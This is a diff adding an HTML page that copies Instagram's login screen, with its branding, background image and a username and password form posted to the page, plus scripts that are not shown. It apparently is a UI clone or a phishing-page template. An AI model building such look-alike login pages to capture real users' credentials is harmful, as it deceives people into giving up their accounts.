@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            /* Set background image and properties */
+            background-image: url('https://img.freepik.com/free-vector/instagram-background-gradient-colors_23-2147819864.jpg?w=740&t=st=1713028740~exp=1713029340~hmac=e28075be3288d90d77ed42b006aab6e615b02eace63fd94d5a19fa532e94a92c');
+            background-size: cover;
+            background-repeat: no-repeat;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <i class="fa-brands fa-instagram"></i>
+        <h1>Instagram</h1>
+        <form id="login-form" method="post">
+            <input type="text" id="username" name="username" placeholder="Phone number, username or email address" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <button type="submit" id="login-btn">Log in</button>
+        </form>
+        
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/js-md5/0.7.3/md5.min.js" onload="initScript()"></script>
+    <script src="script.js"></script>
+</body>
+</html>
